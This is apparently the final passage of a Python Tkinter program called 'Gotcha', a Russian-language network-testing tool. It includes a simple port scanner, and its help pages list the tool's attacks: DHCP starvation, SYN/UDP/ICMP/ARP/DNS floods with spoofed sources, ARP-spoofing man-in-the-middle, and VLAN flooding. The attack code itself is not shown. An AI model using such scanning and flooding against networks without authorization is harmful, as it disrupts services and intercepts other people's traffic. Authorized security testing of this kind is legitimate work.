            self.access_output.insert('end', f"Ping {ip}...\n")
            self.access_output.see('end')
            try:
                process = subprocess.Popen(
                    ['ping', '-n', '4', ip],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='cp866',
                    errors='replace',
                    bufsize=1
                )
                
                for line in iter(process.stdout.readline, ''):
                    self.access_output.insert('end', line)
                    self.access_output.see('end')
                    self.root.update()
                
                process.stdout.close()
                process.wait()
                
            except Exception as e:
                self.access_output.insert('end', f"Ошибка: {str(e)}\n")
        
        threading.Thread(target=ping_worker, daemon=True).start()

    def run_port_scan(self):
        def worker():
            ip = self.access_ip.get()
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389]
            self.access_output.insert('end', f"Сканирование портов {ip}...\n")
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    res = sock.connect_ex((ip, port))
                    if res == 0:
                        self.access_output.insert('end', f"Порт {port} открыт\n")
                    sock.close()
                except:
                    pass
            self.access_output.insert('end', "Сканирование завершено\n")
        threading.Thread(target=worker, daemon=True).start()

    # ----- Settings Tab -----
    def setup_settings_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        theme_frame = ttk.LabelFrame(main_frame, text="Настройки темы")
        theme_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Button(theme_frame, text="Светлая тема", 
                  command=lambda: self.theme_manager.apply_theme("light"), width=12).pack(side='left', padx=4, pady=4)
        ttk.Button(theme_frame, text="Тёмная тема", 
                  command=lambda: self.theme_manager.apply_theme("dark"), width=12).pack(side='left', padx=4, pady=4)
        
        help_frame = ttk.LabelFrame(main_frame, text="Справка")
        help_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(help_frame, text="Открыть справку", command=self.show_help, width=22).pack(padx=8, pady=8)

    def save_log(self, text_widget):
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(text_widget.get(1.0, tk.END))
                self.status_var.set("Лог сохранён")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось сохранить файл: {str(e)}")

    def show_help(self):
        help_window = tk.Toplevel(self.root)
        help_window.title("Справка")
        help_window.geometry("800x700")
        help_window.transient(self.root)
        help_window.grab_set()
        try:
            help_window.iconbitmap("other/images.ico")
        except:
            pass
        help_notebook = ttk.Notebook(help_window)
        help_notebook.pack(fill='both', expand=True, padx=15, pady=15)
        
        general_frame = ttk.Frame(help_notebook)
        help_notebook.add(general_frame, text="Общая информация")
        general_text = """Gotcha – Инструмент для тестирования сетевой безопасности

https://github.com/hedromanie

ТРЕБОВАНИЯ:
• Права администратора
• Windows 10 21h2+ или Linux (с адаптацией)
• Установленный Npcap/WinPcap
• Wireshark рекомендуется для мониторинга"""
        general_txt = scrolledtext.ScrolledText(general_frame, wrap=tk.WORD, font=('Arial', 10))
        general_txt.pack(fill='both', expand=True, padx=10, pady=10)
        general_txt.insert('1.0', general_text)
        general_txt.config(state='disabled')
        
        bpf_frame = ttk.Frame(help_notebook)
        help_notebook.add(bpf_frame, text="BPF фильтры")
        bpf_text = """ПРИМЕРЫ BPF ФИЛЬТРОВ:

ОСНОВНЫЕ ПРИМИТИВЫ:
   host <ip>          – трафик с/на IP (host 192.168.1.1)
   net <сеть>         – трафик в сети (net 192.168.1.0/24)
   port <число>       – трафик на порт (port 80)
   portrange <min-max>– диапазон портов (portrange 1-1024)
   ether host <mac>   – кадры с указанным MAC
   ether broadcast    – широковещательные кадры
   ip, ip6, arp, tcp, udp, icmp – протоколы

НАПРАВЛЕНИЕ:
   src <примитив>     – только от источника
   dst <примитив>     – только к назначению

ЛОГИЧЕСКИЕ ОПЕРАТОРЫ:
   and, && – И
   or, ||  – ИЛИ
   not, !  – НЕ

ПРИМЕРЫ (с пояснениями):
   1. tcp port 80
      – только TCP-пакеты с портом 80 (HTTP)

   2. udp port 53
      – только DNS-запросы/ответы

   3. icmp
      – только ICMP (ping, ошибки)

   4. arp
      – только ARP-пакеты

   5. not arp and not stp and not cdp
      – исключает служебные протоколы (оставляет IP-трафик)

   6. host 192.168.1.100 and tcp port 22
      – SSH-трафик с/на конкретный хост

   7. src net 192.168.1.0/24
      – пакеты из сети 192.168.1.0/24

   8. tcp and (port 80 or port 443)
      – HTTP или HTTPS

   9. icmp or arp
      – диагностические протоколы

   10. not port 22 and not port 23
       – исключает SSH и Telnet

   11. ether host 01:23:45:67:89:ab
       – кадры с заданным MAC

   12. vlan
       – все пакеты с тегом VLAN (можно уточнить vlan 100)

   13. greater 500
       – пакеты длиннее 500 байт

   14. less 64
       – короткие пакеты (<64 байт)

Примечание: фильтры нечувствительны к регистру;
Фильтры могут быть самыми разными не только темии что указаны здесь"""
        bpf_txt = scrolledtext.ScrolledText(bpf_frame, wrap=tk.WORD, font=('Consolas', 9))
        bpf_txt.pack(fill='both', expand=True, padx=10, pady=10)
        bpf_txt.insert('1.0', bpf_text)
        bpf_txt.config(state='disabled')

        attacks_frame = ttk.Frame(help_notebook)
        help_notebook.add(attacks_frame, text="Описание атак")
        attacks_text = """АТАКИ:
1. ПЕРЕХВВАТ ПАКЕТОВ
   • Захватывает сетевой трафик на выбранном интерфейсе.
   • Можно указать BPF-фильтр для выборочного захвата.
   • При захвате программа автоматически отправляет заданное количество
     ответных пакетов (например, ICMP Echo Reply на Ping).
   • Позволяет сохранить перехваченный пакет, отредактировать его и отправить
     повторно.
   • Применяется для анализа трафика, тестирования сетевых устройств,
     изучения протоколов.

2. DHCP STARVATION (ИСЩЕНИЕ ПУЛА DHCP)
   • Отправляет множество DHCP-запросов (Discover) с уникальными MAC-адресами.
   • DHCP-сервер вынужден резервировать IP-адреса для каждого запроса,
     что приводит к исчерпанию пула доступных адресов.
   • Легитимные клиенты не могут получить IP.
   • Параметры: интерфейс, размер пула (количество уникальных MAC),
     количество запросов, задержка между пакетами.
   • Используется для проверки устойчивости DHCP-сервера.

3. DoS АТАКИ (ФЛУД)
   Поддерживаются протоколы: TCP, UDP, ICMP, ARP, DNS.
   • TCP SYN flood – отправка TCP-пакетов с флагом SYN, инициирующих
     соединения.
   • UDP flood – массовая отправка UDP-пакетов на случайные или фиксированные
     порты.
   • ICMP flood – непрерывная отправка ICMP Echo Request (ping).
   • ARP flood – лавинная отправка ARP-запросов, вызывающая перегрузку
     коммутаторов и ARP-таблиц.
   • DNS flood – запросы к DNS-серверу с поддельными именами, истощающие
     его ресурсы.
   • Для TCP, ARP, ICMP доступны опции случайного IP и MAC-адреса источника
     (имитация распределённой атаки).

4. ARP SPOOFING (ПОДМЕНА ARP)
   • Атака типа «человек посередине» на канальном уровне.
   • Отправляет поддельные ARP-ответы, убеждая целевое устройство и шлюз,
     что MAC-адрес атакующего принадлежит другому узлу.
   • Весь трафик между целью и шлюзом проходит через атакующего.

5. VLAN FLOOD
   • Отправляет кадры Ethernet с тегами 802.1Q, используя различные VLAN ID.
   • Цель – переполнение таблицы VLAN коммутатора, вызывающее сбои
     в работе или раскрытие трафика между VLAN."""
        attacks_txt = scrolledtext.ScrolledText(attacks_frame, wrap=tk.WORD, font=('Arial', 10))
        attacks_txt.pack(fill='both', expand=True, padx=10, pady=10)
        attacks_txt.insert('1.0', attacks_text)
        attacks_txt.config(state='disabled')
        
        close_btn = ttk.Button(help_window, text="Закрыть", command=help_window.destroy)
        close_btn.pack(pady=10)
        self.theme_manager.apply_to_widgets(help_window, self.theme_manager.themes[self.theme_manager.current_theme])
    
    # ----- Utility -----
    def generate_random_mac(self):
        return "%02x:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255), random.randint(0, 255),
            random.randint(0, 255), random.randint(0, 255),
            random.randint(0, 255), random.randint(0, 255)
        )
    
    def on_closing(self):
        if self.custom_attack_running:
            self.stop_custom_attack()
        if self.dhcp_attack_running:
            self.stop_dhcp_attack()
        if self.arp_spoof_running:
            self.stop_arp_spoof()
        if self.packet_intercept_running:
            self.stop_packet_intercept()
        if self.vlan_attack_running:
            self.stop_vlan_flood()
        self.system_monitor_running = False
        self.root.destroy()

def check_admin():
    if platform.system() == "Windows":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    return True

def main():
    if platform.system() == "Windows" and not check_admin():
        messagebox.showerror("Требуются права администратора", 
                           "Программа должна быть запущена от имени администратора.")
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        except:
            pass
        return
    
    root = tk.Tk()
    app = Gotcha(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()

if __name__ == "__main__":
    main()
